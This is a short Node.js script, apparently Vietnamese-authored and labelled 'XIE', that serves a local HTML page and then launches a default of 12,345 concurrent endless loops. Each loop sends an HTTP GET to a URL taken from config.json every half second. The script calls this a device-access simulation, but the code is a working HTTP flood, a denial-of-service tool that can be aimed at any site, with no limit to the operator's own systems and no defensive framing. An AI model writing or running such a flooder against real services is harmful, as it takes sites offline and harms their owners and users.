const axios = require('axios');
const http = require('http');
const fs = require('fs');

let consoleOutputEnabled = true; 

const server = http.createServer((req, res) => {
  fs.readFile('xie.html', 'utf8', (err, data) => {
    if (err) {
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Internal Server Error');
    } else {
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    }
  });
});

server.listen(() => {
  fs.readFile('config.json', 'utf8', (err, configData) => {
    if (err) {
      console.error(err.message);
      return;
    }

    try {
      const config = JSON.parse(configData);
      const linkToCheck = config.linkToCheck;
      const numberOfDevices = config.numberOfDevices || 12345;
      consoleOutputEnabled = config.consoleOutputEnabled !== undefined ? config.consoleOutputEnabled : true;

      simulateDeviceAccess(linkToCheck, numberOfDevices);
    } catch (jsonError) {
      console.error(jsonError.message);
    }
  });
});

async function simulateDeviceAccess(linkToCheck, numberOfDevices) {
  const devicePromises = [];

  for (let i = 0; i < numberOfDevices; i++) {
    devicePromises.push(checkServerStatus(linkToCheck, i + 1));
  }

  await Promise.all(devicePromises);
}

async function checkServerStatus(linkToCheck, deviceId) {
  let loadCount = 0;

  while (true) {
    try {
      const response = await axios.get(linkToCheck);

      if (response.status === 200) {
        if (consoleOutputEnabled) {
          console.log(`[ XIE ${deviceId} - ${loadCount + 1} ] Ổn định !!`);
        }
      } else {
        if (consoleOutputEnabled) {
          console.log(`[ XIE ${deviceId} - ${loadCount + 1} ] Xảy ra : ${response.status}`);
        }
      }
    } catch (error) {
      if (consoleOutputEnabled) {
        console.error(`[ XIE ${deviceId} - ${loadCount + 1} ] Xảy ra : ${error.message}`);
      }
    }

    loadCount++;

    await new Promise(resolve => setTimeout(resolve, 500));
  }
}